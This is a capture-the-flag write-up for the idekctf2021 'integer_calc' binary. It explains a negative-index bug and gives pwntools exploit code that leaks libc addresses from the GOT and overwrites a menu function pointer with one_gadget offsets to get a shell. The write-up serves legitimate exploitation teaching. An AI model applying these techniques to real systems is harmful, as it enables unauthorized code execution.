# integer\_calc

## Tags

- x86-64
- pwnc
- idekctf2021
- type confusion
- integer overflow

## Intro

This is a challenge from idekctf2021. It's a type confusion mixed with integer
overflow vulnerability. It's a very simple challenge that I use to show off my
library [pwnc](https://github.com/jhilbs3/pwnc).

## Analysis

Let's see what protections we are dealing with

    $ checksec integer_calc
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

`NX`, `PIE`, and `Partial RELRO`. Now we need to examine the binary to figure
out where the bugs are. When you first run `integer_calc` you are presented
with a menu that looks like

    $ ./integer_calc
    Welcome to my arithmetic calculator!
    0) store number
    1) remove number
    2) add two numbers
    3) subtract two numbers
    4) multiply two numbers
    5) divide two numbers
    6) exit
    > 

Challenges with menus like this usually allow some combination to trigger a 
leak and another combination of options to trigger code execution. Because of
`PIE` and `ASLR` we will almost certainly need a leak. Loading the program into
`ghidra` we can see how it really works. The menu options are function pointers
stored in `rw-` memory.

    void main(void)

    {
      uint uVar1;

      puts("Welcome to my arithmetic calculator!");
      do {
        uVar1 = menu();
        (*(code *)operations[uVar1])();
      } while( true );
    }

This is supposed to be a calculator that can save numbers for later use. It
stores numbers in an array in `rw-` memory. This is the function used to read
the desired index from the user

    int get_index(void)

    {
      int local_c;

      printf("index: ");
      __isoc99_scanf("%d",&local_c);
                        /* BUG: Index can be negative */
      if (0x20 < local_c) {
        puts("Invalid index");
                        /* WARNING: Subroutine does not return */
        exit(-1);
      }
      return local_c;
    }

The method only tests to see if a signed integer index is greater than the max
number of stored values. We can send a negative value to bypass this check. The
store method shows us how can we harness this vulnerability into a very useful
relative write primitive

    void store(void)

    {
      undefined8 local_18;
      uint index;

      index = get_index();
      printf("value: ");
      __isoc99_scanf("%lu",&local_18);
                        /* BUG: Index can be negative */
      numbers[(int)index] = local_18;
      printf("Number %lu stored at index %d successfully\n",local_18,(ulong)index);
      return;
    }

We can store an `unsigned long` at any location before our number array.
Looking at the memory in `ghidra` we can see that the `GOT` and the 
`operations` function pointer array are both before the `numbers` array.
Execution control is now solved but we still don't know where anything is in
memory. The `add` function solves that mystery for us

    void add(void)

    {
      int iVar1;
      int iVar2;

      printf("First number\'s ");
      iVar1 = get_index();
      printf("Second number\'s ");
      iVar2 = get_index();
      printf("Addition result: %lu\n",numbers[iVar2] + numbers[iVar1]);
      return;
    }

We can harness a relative read with the type confusion vulnerability we found
in `get_index`. We will store `0` somewhere and add that index to any desired
negative offset of the `numbers` array. These two primitives are enough to get
a shell.

## Solution

First we will need to find the location of `libc` in memory. To do this we use
our relative read primitive described above to leak addresses from the `GOT`.

    puts = leak(elf.got.puts)                                                   
    log.info(f"puts addr = {hex(puts)}")                                        
                                                                                     
    printf = leak(elf.got.printf)                                               
    log.info(f"printf addr = {hex(printf)}")

The creators of this challenge didn't provide the targets libc but thats no 
issue because I wrote a library that will help us here.
[pwnc](https://github.com/jhilbs3/pwnc) uses leaked symbol offsets to query
[libc-database](https://libc.rip/) for a known libc. If successful we will be 
presented with the exact libc binary that is running on our target. `pwnc` can
be `pip` installed with

    pip3 install pwnc

We will use our previously leaked addresses to obtain a bytestream that is the
target's `libc`

    log.info(f"Attempting to download libc...")                                 
    try:                                                                        
        libc_bytes = pwnc.get_libc(addrs)                                       
    except pwnc.PWNCResponseError as e:                                         
        log.error(f"bad connection to database or libc does not exist: {e}")    
        return 1 

With `libc` in hand we can now write an exploit that should work **regardless
of where the target binary is running**. This means we can write one exploit
that will run against our local `libc` and the targets without issue. I wanted
to take this exploit to full shellcode execution but it ended up being a very
annoying hassle. Instead we will loop over glibc one\_gadgets obtained via
this python library [one\_gadget](https://pypi.org/project/one-gadget). With
`libc` already leaked we will do the following

1. loop over one\_gadgets
2. calculate the address by leaking `puts@got` and adding gadget offset
3. write address of gadget to `operations[divide]`
4. send b"5\n"
5. if our connection stays alive we should have a shell

That looks like

    log.info(f"Looping over one gadgets from glibc...")
    with tempfile.NamedTemporaryFile() as fd:
        fd.write(libc_bytes)
        libc = ELF(fd.name) 
        
        first = True

        for offset in generate_one_gadget(fd.name):
            log.info(f"trying offset {offset}")

            # to allow us to use our first connection
            if(not first):
                if(args.live):
                    r = remote(args.ip, args.port)
                else:
                    r = process(binary_name)

            first = False
            
            # need 0 to leak with add method
            store(0, elf.sym.numbers)

            # get libc address since new process
            puts = leak(elf.got.puts)
            libc.address = puts - libc.sym.puts

            # write one_gadget to divide menu option and trigger it
            store(libc.address + offset, elf.sym.operations + (5*8))
            try:
                r.sendline(b"5")

                r.sendline(b"id")
                results = r.recvline()
                if(b"uid" in results):
                    log.success("Shell acquired ;)")
                    r.interactive()
                r.close()
                return 0
            except:
                log.warn(f"Failed with offset {offset}")
                continue
    return 1

Checkout `solve.py` for the solution.
